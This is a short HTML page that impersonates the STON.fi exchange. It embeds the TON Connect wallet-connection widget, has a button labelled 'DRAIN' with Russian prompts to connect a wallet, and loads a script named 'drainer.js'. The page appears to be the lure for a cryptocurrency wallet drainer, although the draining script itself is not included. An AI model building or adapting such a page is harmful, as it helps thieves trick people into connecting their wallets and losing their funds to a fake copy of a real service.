<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STON.fi</title>
    <!-- Подключаем актуальную UI-библиотеку (версия 2.1.0) -->
    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.1.0/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            background: #0b0e11;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #1e2329;
            padding: 40px;
            border-radius: 20px;
        }
        #ton-connect {
            margin: 20px 0;
        }
        .btn {
            background: #00a3ff;
            border: none;
            color: #fff;
            padding: 14px 40px;
            border-radius: 40px;
            font-size: 18px;
            cursor: pointer;
        }
        .btn:hover { background: #0090e0; }
        .btn:disabled { opacity: 0.5; }
        #status { margin-top: 15px; color: #f0b90b; }
    </style>
</head>
<body>
    <div class="container">
        <h2>STON.fi</h2>
        <div id="ton-connect"></div> <!-- Сюда будет встроена кнопка подключения -->
        <button id="drainBtn" class="btn" disabled>DRAIN</button>
        <div id="status">Подключите кошелёк</div>
    </div>

    <!-- Основной скрипт -->
    <script src="drainer.js"></script>
</body>
</html>
